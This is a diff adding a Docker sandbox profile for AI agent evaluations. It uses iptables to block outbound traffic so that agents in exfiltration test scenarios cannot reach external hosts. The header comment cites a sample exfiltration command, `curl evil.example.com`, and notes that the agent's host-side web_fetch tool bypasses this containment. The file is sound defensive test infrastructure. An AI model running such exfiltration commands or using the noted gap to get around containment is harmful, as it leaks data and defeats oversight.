@@ -1,0 +1,43 @@
+# Network-isolated sandbox profile for evaluations.
+#
+# Same omni-code eval image as devbox.yml (built from evaluations/Dockerfile,
+# which bakes iptables + /usr/local/bin/apply-network-isolation.sh for this
+# profile), but the container's outbound network is
+# locked down: an init hook runs the image's apply-network-isolation.sh, which
+# applies iptables OUTPUT rules dropping everything except DNS, loopback, the
+# Docker host gateway, and the allowlist. Used for exfiltration scenarios where
+# we need a complying agent's `curl evil.example.com` (run via execute_bash,
+# which executes IN the container) to actually FAIL — not just be observed in
+# the transcript.
+#
+#   environment:
+#     profile: evaluations/profiles/devbox-isolated.yml
+#
+# Note: this only contains bash-driven egress. `web_fetch` runs host-side (in
+# the agent process), so it is NOT blocked by container iptables — exfil tests
+# that rely on web_fetch are guarded by their transcript measure, not by this.
+version: 1
+
+client:
+  type: docker
+  # CAP_NET_ADMIN lets the init hook program iptables; the unprivileged
+  # workload cannot undo the rules. seccomp=unconfined is required for
+  # iptables-nft to load its netlink modules.
+  cap_add: ["NET_ADMIN"]
+  security_opt: ["seccomp=unconfined"]
+
+options:
+  image: ghcr.io/ericmichael/omni-code-eval@sha256:5dcc07ed0532068eae155c3ab08973eb5f1900bfef8bf28552561a472660ac85
+
+manifest:
+  environment:
+    # Non-empty allowlist is what arms the script (an EMPTY value makes it a
+    # no-op and applies no restrictions). Loopback only: nothing external is
+    # reachable, so any exfil attempt is rejected. DNS is allowed by the
+    # script regardless, so hostname resolution still works (the connection
+    # afterward is what gets dropped).
+    value:
+      OMNI_SANDBOX_NETWORK_ALLOWLIST: "127.0.0.1/32"
+
+init:
+  - "apply-network-isolation.sh"
